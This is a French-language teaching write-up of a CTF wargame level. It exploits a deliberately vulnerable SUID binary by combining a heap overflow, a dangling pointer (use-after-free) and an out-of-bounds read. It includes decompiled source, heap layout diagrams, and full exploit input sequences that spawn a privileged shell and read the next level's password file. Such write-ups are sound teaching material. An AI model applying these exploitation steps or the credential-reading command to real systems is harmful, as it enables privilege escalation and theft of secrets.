# Level8 - README Pédagogique

## 🎯 Objectif
Exploiter une combinaison de **heap overflow**, **dangling pointer** et **out-of-bounds read** pour obtenir un shell.

**Technique** : Use-After-Free + Out-of-Bounds Read

---

## 🔍 Reconnaissance

### Permissions du fichier
```bash
$ ls -l level8
-rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
    ^
    └─ Bit SUID actif → s'exécute avec les droits de level9
```

### Tests comportementaux
```bash
$ ./level8
(nil), (nil)     ← Affiche auth et service

auth test
0x804a008, (nil)

service admin
0x804a008, 0x804a018

login
Password:
```

Le programme attend des commandes en boucle infinie.

---

## 🛠️ Analyse technique

### Code source (décompilé depuis Ghidra)
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *auth = NULL;     // Variable globale (pointeur)
char *service = NULL;  // Variable globale (pointeur)

int main(void)
{
    char buffer[128];

    while (1) {
        printf("%p, %p \n", auth, service);

        if (fgets(buffer, 128, stdin) == NULL)
            return 0;

        // Commande "auth "
        if (strncmp(buffer, "auth ", 5) == 0) {
            auth = malloc(4);          // ⚠️ Seulement 4 bytes !
            auth[0] = 0;
            if (strlen(buffer + 5) < 30) {
                strcpy(auth, buffer + 5);  // ⚠️ Peut copier jusqu'à 29 bytes !
            }
        }

        // Commande "reset"
        if (strncmp(buffer, "reset", 5) == 0) {
            free(auth);                // ⚠️ Ne met pas auth à NULL !
        }

        // Commande "service"
        if (strncmp(buffer, "service", 7) == 0) {
            service = strdup(buffer + 8);  // Alloue sur le heap
        }

        // Commande "login"
        if (strncmp(buffer, "login", 5) == 0) {
            if (*(int *)(auth + 32) == 0) {  // ⚠️ Lit hors limites !
                fwrite("Password:\n", 1, 10, stdout);
            } else {
                system("/bin/sh");
            }
        }
    }
}
```

**Observations critiques** :
1. `malloc(4)` mais `strcpy()` peut copier jusqu'à 29 bytes → **heap overflow**
2. `free(auth)` sans `auth = NULL` → **dangling pointer**
3. Condition lit `auth + 32` → **out-of-bounds read**
4. `service` alloué juste après `auth` sur le heap

---

## 💣 Vulnérabilités combinées

### 1. Heap Overflow

```c
auth = malloc(4);              // Alloue SEULEMENT 4 bytes
strcpy(auth, buffer + 5);      // Peut copier jusqu'à 29 bytes !
```

**Problème** : On peut écrire bien au-delà des 4 bytes alloués.

**Impact** : Écrase les données adjacentes sur le heap (headers, autres allocations).

### 2. Dangling Pointer

```c
free(auth);  // Libère la mémoire
// auth pointe toujours vers l'ancienne adresse !
```

**Qu'est-ce qu'un dangling pointer ?**

Pointeur qui pointe vers une mémoire qui a été libérée.

```
Avant free(auth) :
auth = 0x0804a008 → [données allouées]

Après free(auth) :
auth = 0x0804a008 → [mémoire libre, peut être réallouée]
                    ⚠️ Dangling pointer !
```

**Correct** :
```c
free(auth);
auth = NULL;  // Évite le dangling pointer
```

**Exploitation** : Si on réalloue cette zone avec `service`, `auth` pointe vers `service` !

### 3. Out-of-Bounds Read

```c
if (*(int *)(auth + 32) == 0) {
    fwrite("Password:\n", 1, 10, stdout);
} else {
    system("/bin/sh");
}
```

**Qu'est-ce que `auth + 32` ?**

```
auth = 0x0804a008
auth + 32 = 0x0804a028

Lis 4 bytes (un int) à l'adresse 0x0804a028
```

**Problème** : `malloc(4)` alloue seulement 4 bytes, mais on lit 32 bytes plus loin !

**C'est une lecture hors limites (out-of-bounds).**

---

## 🔑 Concepts clés

### 1. Variables globales vs allocations heap

**Variables globales** (dans `.bss`) :
```c
char *auth = NULL;     // Pointeur dans .bss
char *service = NULL;  // Pointeur dans .bss
```

**Ce qu'elles pointent** (sur le heap) :
```
.bss (0x0804a000) :
┌──────────────────┐
│ auth = 0x0804a008│ ← Pointeur (4 bytes)
│ service = 0x0804a018│
└──────────────────┘
        ↓
Heap (0x0804a008) :
┌──────────────────┐
│ "test\0"         │ ← Données
└──────────────────┘
```

### 2. Layout du heap avec malloc()

**Après `auth test`** :
```
Heap :
0x0804a000  Header auth (8 bytes)
0x0804a008  auth: "test\0" (4 bytes alloués)
            ^^^^^^^^^^^^^^
            auth pointe ici
```

**Après `service admin`** :
```
Heap :
0x0804a000  Header auth (8 bytes)
0x0804a008  auth: "test\0" (4 bytes)
0x0804a010  Header service (8 bytes)
0x0804a018  service: "admin\0" (~6 bytes)
            ^^^^^^^^^^^^^^^^
            service pointe ici
```

**Allocations séquentielles** → `service` suit directement `auth` sur le heap.

### 3. Comment `service` atteint `auth + 32`

```
auth = 0x0804a008
auth + 32 = 0x0804a028

service = 0x0804a018

Distance : 0x0804a028 - 0x0804a018 = 0x10 = 16 bytes

Si service contient au moins 16 bytes :
service[0..15] occupent 0x0804a018 → 0x0804a027
service[16]    occupe    0x0804a028 ← C'est auth + 32 ! ✅
```

**Visualisation** :
```
0x0804a008  auth (4 bytes)
0x0804a00c  (padding/header)
0x0804a010  (header service)
0x0804a018  service[0..7]     "XXXXXXXX"
0x0804a020  service[8..15]    "XXXXXXXX"
0x0804a028  service[16+]      "XXXX..." ← auth + 32 pointe ici ! ✅
```

**Si service[16] != 0 → Condition vraie → Shell !**

### 4. strdup() - String Duplicate

```c
char *strdup(const char *s);
```

**Fonctionnement** :
1. Calcule `len = strlen(s) + 1`
2. Alloue `malloc(len)`
3. Copie avec `strcpy()`
4. Retourne le pointeur

**Équivalent à** :
```c
char *copy = malloc(strlen(s) + 1);
strcpy(copy, s);
return copy;
```

**Dans notre cas** :
```c
service = strdup(buffer + 8);
// buffer = "service admin\n"
// buffer + 8 = "admin\n"
// strdup alloue 7 bytes et copie "admin\n\0"
```

---

## 🚀 Construction de l'exploit

### Stratégie

**Objectif** : Faire en sorte que `auth + 32` contienne une valeur non-nulle.

**Méthode** :
1. Allouer `auth` avec une chaîne courte
2. Allouer `service` avec une chaîne **longue** (au moins 16+ chars)
3. `service` "recouvre" `auth + 32`
4. `login` → `auth + 32` lit dans `service` → valeur non-nulle → Shell ! ✅

### Variante 1 : Sans reset (simple)

```bash
auth test
service XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
login
```

**Explication** :
```
1. auth test
   → auth = 0x0804a008

2. service XXXX... (long)
   → service = 0x0804a018
   → service occupe jusqu'à auth + 32

3. login
   → *(int *)(auth + 32) lit dans service
   → Valeur = "XXXX" (non NULL)
   → Shell ! ✅
```

### Variante 2 : Avec reset (use-after-free)

```bash
auth test
reset
service XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
login
```

**Explication** :
```
1. auth test
   → auth = 0x0804a008

2. reset
   → free(auth)
   → Mémoire libérée, mais auth = 0x0804a008 (dangling !)

3. service XXXX...
   → strdup() réalloue à 0x0804a008 (même adresse !)
   → service = 0x0804a008 (réutilise l'ancien bloc de auth)

4. login
   → auth + 32 = 0x0804a028
   → Lit dans service
   → Shell ! ✅
```

**Cette variante exploite le use-after-free (dangling pointer).**

---

## 📝 Commandes d'exploitation

### Méthode 1 : Simple (sans reset)

```bash
./level8 << EOF
auth test
service XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
login
cat /home/user/level9/.pass
EOF
```

### Méthode 2 : Use-After-Free (avec reset)

```bash
./level8 << EOF
auth test
reset
service XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
login
cat /home/user/level9/.pass
EOF
```

---

## 🔄 Déroulement de l'exploitation

### Méthode 1 (sans reset)

```
1. auth test
   Heap :
   0x0804a008  auth: "test\0"

2. service XXXX... (32 X)
   Heap :
   0x0804a008  auth: "test\0"
   0x0804a018  service: "XXXX...XXXX\0"
                        ^^^^
                        Position 16+ tombe à auth + 32

3. login
   *(int *)(auth + 32) = *(int *)(0x0804a028)
                       = Lit dans service[16..19]
                       = "XXXX" (0x58585858)
                       != 0 ✅

4. system("/bin/sh") → Shell obtenu ! 🎉
```

### Méthode 2 (avec reset)

```
1. auth test
   auth = 0x0804a008

2. reset
   free(auth)
   auth = 0x0804a008 (dangling !)
   Heap : mémoire libre à 0x0804a008

3. service XXXX...
   strdup() alloue à 0x0804a008 (réutilise le bloc !)
   service = 0x0804a008
   auth = 0x0804a008 (même adresse !)

4. login
   auth + 32 = 0x0804a028
   Lit service[32..35]
   != 0 → Shell ! ✅
```

---

## 📝 Classification

**Type de vulnérabilité** :
- **CWE-122** : Heap-based Buffer Overflow
- **CWE-125** : Out-of-bounds Read
- **CWE-416** : Use After Free (dangling pointer)
- **CWE-250** : Execution with Unnecessary Privileges (SUID)

**Technique d'exploitation** :
- **Heap Overflow + Out-of-Bounds Read**
- **Use-After-Free (optionnel)**

---

## 🎓 Résumé

1. **Vulnérabilités** : malloc(4) trop petit, free() sans NULL, lecture hors limites
2. **Mécanisme** : `service` alloué après `auth`, recouvre `auth + 32`
3. **Condition** : `auth + 32 != 0` → Shell
4. **Exploit** : auth + service long → login
5. **Résultat** : Shell avec les droits de level9

---

## 🔐 Différences avec les niveaux précédents

| | Level7 | Level8 |
|---|---|---|
| **Zone** | Heap | Heap |
| **Technique** | Double indirection | Out-of-bounds read |
| **Cible** | GOT entry | Variable hors limites |
| **Mécanisme** | Overflow → GOT overwrite | Allocation séquentielle |
| **Complexité** | Élevée (2 étapes) | Moyenne (1 étape) |
| **Bug exploité** | strcpy sans limite | malloc trop petit + read OOB |